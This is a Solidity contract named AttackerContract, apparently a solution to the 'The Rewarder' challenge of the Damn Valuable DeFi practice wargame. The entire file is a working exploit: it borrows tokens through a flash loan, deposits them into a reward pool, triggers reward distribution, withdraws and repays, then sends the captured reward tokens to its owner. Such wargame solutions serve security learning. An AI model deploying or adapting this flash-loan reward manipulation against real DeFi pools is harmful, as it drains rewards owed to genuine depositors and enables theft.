// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract AttackerContract {

    address private immutable owner;
    FlashLoanerPool private immutable flashLoanPool;
    TheRewarderPool private immutable rewardPool;
    RewardToken private immutable rewardToken;
    DamnValuableToken public immutable liquidityToken;

    constructor(address _flashLoanPool, address _rewardPool, address _rewardToken, address _liquidityToken) {
        owner = msg.sender;
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);
        liquidityToken = DamnValuableToken(_liquidityToken);
    }

    function exploit(uint256 amount) public {
        require(msg.sender == owner, "Exploit Can only be called by the owner");
        flashLoanPool.flashLoan(amount);
    }

    function claimReward() public {
        require(msg.sender == owner, "Reward Can only be called by the owner");
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external{
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }

    receive() external payable {}

}